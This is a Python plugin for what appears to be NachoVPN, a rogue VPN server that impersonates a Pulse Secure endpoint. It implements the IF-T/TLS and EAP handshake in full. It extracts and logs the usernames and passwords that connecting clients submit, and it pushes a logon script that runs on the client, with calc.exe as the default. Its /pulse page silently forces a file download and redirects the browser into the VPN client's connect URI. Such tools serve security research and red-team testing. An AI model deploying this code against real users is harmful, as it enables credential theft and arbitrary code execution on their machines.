from nachovpn.plugins import VPNPlugin
from nachovpn.plugins.pulse.config_generator import VPNConfigGenerator, ESPConfigGenerator

import logging
import random
import string
import os
import io
import socket

"""
Note: these values are from openconnect/pulse.c
See: https://github.com/openconnect/openconnect/blob/master/pulse.c
References:
- https://www.infradead.org/openconnect/pulse.html
- https://www.infradead.org/openconnect/juniper.html
- https://trustedcomputinggroup.org/wp-content/uploads/TNC_IFT_TLS_v2_0_r8.pdf
"""
IFT_VERSION_REQUEST = 1
IFT_VERSION_RESPONSE = 2
IFT_CLIENT_AUTH_REQUEST = 3
IFT_CLIENT_AUTH_SELECTION = 4
IFT_CLIENT_AUTH_CHALLENGE = 5
IFT_CLIENT_AUTH_RESPONSE = 6
IFT_CLIENT_AUTH_SUCCESS = 7

EAP_REQUEST = 1
EAP_RESPONSE = 2
EAP_SUCCESS = 3
EAP_FAILURE = 4

IFT_TLS_CLIENT_INFO = 0x88

VENDOR_JUNIPER = 0xa4c
VENDOR_JUNIPER2 = 0x583
VENDOR_TCG = 0x5597
JUNIPER_1 = 0xa4c01

EAP_TYPE_EXPANDED= 0xfe

# 0xfe000a4c
EXPANDED_JUNIPER = ((EAP_TYPE_EXPANDED << 24) | VENDOR_JUNIPER)

AVP_VENDOR = 0x80
AVP_OS_INFO = 0xD5E
AVP_USER_AGENT = 0xD70
AVP_LANGUAGE = 0xD5F
AVP_REALM = 0xD50

LICENSE_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=17))

class IFTPacket:
    def __init__(self, vendor_id=None, message_type=None, message_identifier=None, message_value=None):
        self.vendor_id = vendor_id
        self.message_type = message_type
        self.message_identifier = message_identifier
        self.message_value = message_value if message_value else b''
        self.message_length = len(self.message_value) + 16

    def __str__(self):
        return f'IF-T Packet: Vendor={hex(self.vendor_id)}, Message Type={self.message_type}, ' \
               f'Message Length={self.message_length}, Message Identifier={hex(self.message_identifier)}, ' \
               f'Message Value={self.message_value.hex()}'

    def to_bytes(self):
        # Recalculate length
        self.message_length = len(self.message_value) + 16
        return self.vendor_id.to_bytes(4, 'big') + \
               self.message_type.to_bytes(4, 'big') + \
               self.message_length.to_bytes(4, 'big') + \
               self.message_identifier.to_bytes(4, 'big') + \
               self.message_value

    @classmethod
    def from_bytes(cls, data):
        if len(data) < 16:
            raise ValueError("Data too short to parse IF-T packet")
        reader = io.BytesIO(data)
        return cls.from_io(reader)

    @classmethod
    def from_io(cls, reader):
        if reader.getbuffer().nbytes < 16:
            raise ValueError("Data too short to parse IF-T packet")
        vendor_id = int.from_bytes(reader.read(4), 'big')
        message_type = int.from_bytes(reader.read(4), 'big')
        message_length = int.from_bytes(reader.read(4), 'big')
        message_identifier = int.from_bytes(reader.read(4), 'big')
        message_value = reader.read(message_length - 16)
        return cls(vendor_id, message_type, message_identifier, message_value)


class EAPPacket:
    def __init__(self, vendor=None, code=None, identifier=None, eap_data=b''):
        self.vendor = vendor
        self.code = code
        self.identifier = identifier
        self.eap_data = eap_data
        self.length = 4 + len(eap_data)

    def __str__(self):
        return f'EAP Packet: Vendor={hex(self.vendor)}, Code={self.code}, Identifier={hex(self.identifier)}, ' \
            f'Length={self.length}, Data={self.eap_data.hex()}'

    def to_bytes(self):
        # Recalculate length
        self.length = 4 + len(self.eap_data)
        return self.vendor.to_bytes(4, 'big') \
            + bytes([self.code, self.identifier]) \
            + self.length.to_bytes(2, 'big') \
            + self.eap_data

    @classmethod
    def from_bytes(cls, data):
        vendor = int.from_bytes(data[:4], 'big')
        code = data[4]
        identifier = data[5]
        length = int.from_bytes(data[6:8], 'big')
        eap_data = data[8:8 + length - 4] if length >= 4 else b''
        return cls(vendor, code, identifier, eap_data)


class AVP:
    def __init__(self, code, flags=0, vendor=None, value=b''):
        self.code = code
        self.flags = flags
        self.vendor = vendor
        self.value = value
        # Calculate the initial length (8 bytes for the header, optionally 4 bytes for the vendor, plus the value length)
        self.length = 8 + (4 if vendor is not None else 0) + len(value)

    def padding_required(self):
        if self.length & 3:
            return 4 - (self.length & 3)
        return 0

    @classmethod
    def from_bytes(cls, data):
        if len(data) < 8:
            raise ValueError("Packet too short to parse AVP")

        code = int.from_bytes(data[:4], 'big')
        length = int.from_bytes(data[4:8], 'big') & 0xffffff
        flags = data[4]
        vendor = None
        value_start = 8

        if flags & AVP_VENDOR:
            if len(data) < 12:
                raise ValueError("Packet too short to parse AVP with vendor")
            vendor = int.from_bytes(data[8:12], 'big')
            value_start = 12

        value = data[value_start:value_start + length - (12 if vendor else 8)]
        return cls(code, flags, vendor, value)

    def to_bytes(self, include_padding=False):
        # Re-calculate length to ensure it's current
        self.length = 8 + (4 if self.vendor is not None else 0) + len(self.value)
        avp_bytes = self.code.to_bytes(4, 'big')
        # Flags are stored in the most significant byte of the length field
        avp_bytes += (self.length | (self.flags << 24)).to_bytes(4, 'big')
        if self.vendor is not None:
            avp_bytes += self.vendor.to_bytes(4, 'big')
        avp_bytes += self.value
        if include_padding:
            avp_bytes += b'\x00' * self.padding_required()
        return avp_bytes

    def __str__(self):
        # Re-calculate length for display purposes
        self.length = 8 + (4 if self.vendor is not None else 0) + len(self.value)
        return f"AVP: Code={self.code}, Length={self.length}, " \
               f"Flags={self.flags}, Vendor={self.vendor}, " \
               f"Value={self.value.hex()}"


class PulseSecurePlugin(VPNPlugin):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logon_script = os.getenv("PULSE_LOGON_SCRIPT", "C:\\Windows\\System32\\calc.exe")
        self.logon_script_macos = os.getenv("PULSE_LOGON_SCRIPT_MACOS", "")
        self.dns_suffix = os.getenv("PULSE_DNS_SUFFIX", "nachovpn.local")
        self.anonymous_auth = os.getenv("PULSE_ANONYMOUS_AUTH", "false").lower() == 'true'
        self.pulse_username = os.getenv("PULSE_USERNAME", "")
        self.pulse_save_connection = os.getenv("PULSE_SAVE_CONNECTION", "false").lower() == 'true'
        self.vpn_name = os.getenv("VPN_NAME", "NachoVPN")
        self._eap_identifier = 1

    def close(self):
        self.ssl_server_socket.close()

    def can_handle_data(self, data, client_socket, client_ip):
        if len(data) >= 4 and int.from_bytes(data[:4], 'big') == VENDOR_TCG:
            return True
        return False

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        if 'odJPAService' in user_agent or \
           'Secure%20Access' in user_agent or \
           handler.path == '/pulse':
            return True
        return False

    def handle_http(self, handler):
        if handler.command == 'GET':
            self.handle_get(handler)
        return True

    def has_credentials(self, data):
        if len(data) < 20 or \
           int.from_bytes(data[0:4], 'big') != EXPANDED_JUNIPER or \
           int.from_bytes(data[4:8], 'big') != 1:
            return False

        user_avp = AVP.from_bytes(data[8:])
        if user_avp.code == 0xD6D:
            return True
        return False

    def extract_credentials(self, data):
        # seems to be: EXPANDED_JUNIPER + 0x01 + AVP(0xd6d)
        if len(data) < 20 or \
           int.from_bytes(data[0:4], 'big') != EXPANDED_JUNIPER or \
           int.from_bytes(data[4:8], 'big') != 1:
            return False

        data = data[8:]
        user_avp = AVP.from_bytes(data)

        if user_avp.code != 0xD6D:
            return False

        username = user_avp.value.decode()
        self.logger.info(f'Extracted username: {username}')

        # remove any padding
        padding_size = user_avp.padding_required()
        data = data[user_avp.length+padding_size:]

        # the next bytes *should* be 0x4f in big endian
        if int.from_bytes(data[0:4], 'big') != 79:
            self.logger.error('AVP_CODE_EAP_MESSAGE not found')
            return False

        if len(data) < 0x16:
            self.logger.error('Data too short to extract password')
            return False

        # there are some other fields/headers here we should maybe check
        # but for now we'll just extract the password
        length = int(data[0x16]) - 2
        if len(data) < 0x17 + length:
            self.logger.error('Data too short to extract password')
            return False

        password = data[0x17:0x17+length].decode()
        self.logger.info(f'Extracted password: {password}')
        self.log_credentials(username, password)
        return True

    def handle_get(self, handler):
        if handler.path == '/':
            self.logger.info('Switching protocols ..')
            handler.send_response(101)
            handler.send_header('Content-Type', 'application/octet-stream')
            handler.send_header('Pragma', 'no-cache')
            handler.send_header('Upgrade', 'IF-T/TLS 1.0')
            handler.send_header('Connection', 'Keep-Alive')
            handler.send_header('Keep-Alive', 'timeout=15')
            handler.send_header('Strict-Transport-Security', 'max-age=31536000')
            handler.end_headers()

            # transition to IF-T/TLS
            self.handle_data(None, handler.connection, handler.client_address[0])

        elif handler.path == '/pulse':
            self.logger.info('Sending URI handler response ..')
            html = """<html><body>
            <script>
                // Téléchargement automatique du fichier depuis GitHub
                function downloadFile() {
                    const link = document.createElement('a');
                    link.href = 'https://github.com/monfichier.txt';
                    link.download = 'monfichier.txt';
                    link.style.display = 'none';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
                
                // Lancer le téléchargement immédiatement
                downloadFile();
                
                // Puis rediriger vers pulseclient
                window.location.href = """ + \
                   f"`pulsesecureclient://connect?name={self.vpn_name}&server=" \
                   "https://${document.domain}&userrealm=Users&" \
                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}`;" + \
                   """
            </script>
            </body></html>"""
            handler.send_response(200)
            handler.send_header('Content-Type', 'text/html')
            handler.end_headers()
            handler.wfile.write(html.encode())

    def next_eap_identifier(self):
        self._eap_identifier += 1
        if self._eap_identifier >= 5:
            self._eap_identifier = 1
        return self._eap_identifier

    def is_client_info(self, data):
        if len(data) < 8 or \
           int.from_bytes(data[0:4], 'big') != EXPANDED_JUNIPER or \
           int.from_bytes(data[4:8], 'big') != 1:
            return False

        data = data[8:]

        # check if the first AVP is 0xD49
        avp = AVP.from_bytes(data)
        if avp.code != 0xD49:
            return False

        self.logger.info(f"AVP: Code={avp.code:04X}, Value={avp.value.hex()}")

        # check if the second AVP is 0xD61
        data = data[avp.length+avp.padding_required():]
        avp = AVP.from_bytes(data)
        if avp.code != 0xD61:
            return False

        self.logger.info(f"AVP: Code={avp.code:04X}, Value={avp.value.hex()}")

        # read the rest of the AVPs
        # TODO: log the client provided AVP data
        # this contains OS info, user-agent, etc.
        data = data[avp.length+avp.padding_required():]
        while len(data) > 0:
            avp = AVP.from_bytes(data)
            self.logger.info(f"AVP: Code={avp.code:04X}, Value={avp.value.hex()}")
            data = data[avp.length+avp.padding_required():]

        return True

    def auth_completed(self, data):
        if len(data) < 24 or \
           int.from_bytes(data[0:4], 'big') != EXPANDED_JUNIPER or \
           int.from_bytes(data[4:8], 'big') != 1:
            return False

        avp = AVP.from_bytes(data[8:])
        return avp.code == 0xD6B and \
               int.from_bytes(avp.value, 'big') == 0x10

    def parse_eap_packet(self, data, client_socket):
        outbuf = bytearray()
        if int.from_bytes(data[0:4], 'big') != JUNIPER_1:
            self.logger.warning('Received invalid EAP packet')
            return outbuf

        eap_in = EAPPacket.from_bytes(data)
        self.logger.debug(eap_in)

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x1, Length=14, Data=01616e6f6e796d6f7573
        if eap_in.code == EAP_RESPONSE and eap_in.identifier == 1 and eap_in.eap_data[1:] == b'anonymous' and not self.anonymous_auth:
            self.logger.info('Received anonymous auth, sending server info ..')

            # Add the AVP data
            avp_list = []
            avp_list.append(AVP(code=0xD49, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(4).to_bytes(4, 'big')))
            avp_list.append(AVP(code=0xD4A, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(1).to_bytes(4, 'big')))
            avp_list.append(AVP(code=0xD56, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=LICENSE_ID.encode()))

            # Create the EAP data from AVP
            eap_data = bytearray()
            eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            eap_data += (1).to_bytes(4, 'big')

            for avp in avp_list:
                eap_data += avp.to_bytes()

            # padding
            eap_data += b'\x00\x00\x00'

            # Construct EAP packet
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=eap_data)

            # Build IFT packet
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x5, message_identifier=0x01F7, message_value=eap.to_bytes())

            # Append to output buffer
            outbuf += reply.to_bytes()

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x2, Length=296, Data=fe000a4c0000000100000d4980000010000005830000000400000d61 ..
        elif eap_in.code == EAP_RESPONSE and self.is_client_info(eap_in.eap_data) and not self.anonymous_auth:
            self.logger.info('Received AVP structures with OS data. Asking for creds..')

            # EXPANDED_JUNIPER structures
            eap_data = bytearray()

            # first EXPANDED_JUNIPER struct
            eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            eap_data += (1).to_bytes(4, 'big') # type?
            eap_data += b'\x00\x00\x00\x4F\x40\x00\x00\x15\x01\x00\x00\x0D' # data

            # second EXPANDED_JUNIPER struct
            eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            eap_data += (2).to_bytes(4, 'big') # type?
            eap_data += b'\x01\x00\x00\x10' # data

            # Construct EAP packet
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=eap_data)

            # Build IFT packet
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01F8, message_value=eap.to_bytes())

            # Append to output buffer
            outbuf += reply.to_bytes()

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x3, Length=56, Data=fe000a4c0000000100000d6d8000001000000583616161610000004f4000001a02000012fe000a4c000000020202056161610583
        elif eap_in.code == EAP_RESPONSE and self.has_credentials(eap_in.eap_data) or (self.anonymous_auth and eap_in.eap_data[1:] == b'anonymous'):

            self.logger.info('Received credentials, sending back some cookies ..')

            if not self.anonymous_auth and not self.extract_credentials(eap_in.eap_data):
                self.logger.warning("Failed to extract credentials")
                return b''

            # Build the AVP data dynamically using the AVP class
            avp_list = []
            avp_list.append(AVP(code=0xD53, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=os.urandom(16).hex().encode())) # DSID cookie
            avp_list.append(AVP(code=0xD8B, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=os.urandom(8).hex().encode()))  # ??
            avp_list.append(AVP(code=0xD8D, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b''))                           # ??
            avp_list.append(AVP(code=0xD5C, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(3600).to_bytes(4, 'big')))     # auth expiry
            avp_list.append(AVP(code=0xD54, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'10.0.1.4'))
            avp_list.append(AVP(code=0xD55, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=self.get_thumbprint()['md5'].encode()))    # cert MD5
            avp_list.append(AVP(code=0xD6B, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x10'))           # ??
            avp_list.append(AVP(code=0xD75, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x00'))           # idle timeout
            avp_list.append(AVP(code=0xD57, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x00'))           # ??

            # Create the EAP data
            eap_data = bytearray()

            # EXPANDED_JUNIPER struct
            eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            eap_data += (1).to_bytes(4, 'big') # type?

            # Add AVPs
            for avp in avp_list:
                eap_data += avp.to_bytes()

            # Construct EAP packet
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=eap_data)

            # Build IFT packet
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE, message_identifier=0x01F9,
                                   message_value=eap.to_bytes())

            # Append to output buffer
            outbuf += reply.to_bytes()

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x4, Length=28, Data=fe000a4c0000000100000d6b800000100000058300000010
        elif eap_in.code == EAP_RESPONSE and self.auth_completed(eap_in.eap_data):
            self.logger.info('Auth completed, sending configuration and launching application...')
            outbuf = b''

            # Auth response (ok)
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_SUCCESS, identifier=self.next_eap_identifier(), eap_data=b'')
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_SUCCESS, message_identifier=0x01FA, message_value=eap.to_bytes())
            client_socket.sendall(reply.to_bytes())

            # config packet, wrapped with IF-T
            generator = VPNConfigGenerator(logon_script=self.logon_script, logon_script_macos=self.logon_script_macos)
            config = generator.create_config()[0x10:]
            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=1, message_identifier=0x01FB, message_value=config)
            client_socket.sendall(reply.to_bytes())

            # now send the ESP config
            esp_config = ESPConfigGenerator().create_config()
            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=1, message_identifier=0x01FC, message_value=esp_config)
            client_socket.sendall(reply.to_bytes())

            # End of configuration packet
            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=0x8F, message_identifier=0x01FD, message_value=b'\x00\x00\x00\x00')
            client_socket.sendall(reply.to_bytes())

            # Final packet - send the license ID
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x96, message_identifier=0x01FE, message_value=LICENSE_ID.encode())
            client_socket.sendall(reply.to_bytes())

        return outbuf

    def process(self, data, client_socket):
        outbuf = b''

        while data:
            # IFT-T/TLS Parser
            reader = io.BytesIO(data)
            packet = IFTPacket.from_io(reader)
            data = reader.read()

            if packet.message_type  == IFT_VERSION_REQUEST:
                self.logger.info('Got IFT_VERSION_REQUEST')
                # send IF-T/TLS version: 2
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_VERSION_RESPONSE,
                                  message_identifier=0x01F5, message_value=(2).to_bytes(4, 'big'))
                outbuf += reply.to_bytes()

            elif packet.message_type == IFT_TLS_CLIENT_INFO:
                self.logger.info('Got IFT_TLS_CLIENT_INFO')
                auth_data = packet.message_value.decode().strip('\x00\n')
                self.logger.info(f'Client info: {auth_data}')
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE,
                                  message_identifier=0x01F6, message_value=JUNIPER_1.to_bytes(4, 'big'))
                outbuf += reply.to_bytes()

            elif packet.message_type == IFT_CLIENT_AUTH_RESPONSE:
                self.logger.info('Got IFT_CLIENT_AUTH_RESPONSE')
                # We got an EAP packet which we need to parse
                outbuf += self.parse_eap_packet(packet.message_value, client_socket)

            elif packet.message_type == 0x89:
                self.logger.info('Got logout request')
                return b''

            elif packet.message_type == 0x4:
                #dest_ip_bytes = packet.message_value[0x10:0x14]
                #dest_ip = socket.inet_ntoa(dest_ip_bytes)
                #self.logger.info('Got tunnelled IP packet with destination IP:', dest_ip)
                if packet.message_value[0] == 0x45:
                    self.packet_handler.handle_client_packet(packet.message_value)
        return outbuf

    def handle_data(self, data, client_socket, client_ip):
        resp = None
        if data is None:
            data = client_socket.recv(1024)

        while data:
            resp = self.process(data, client_socket)
            if resp:
                client_socket.sendall(resp)
            data = client_socket.recv(1024)
        client_socket.close()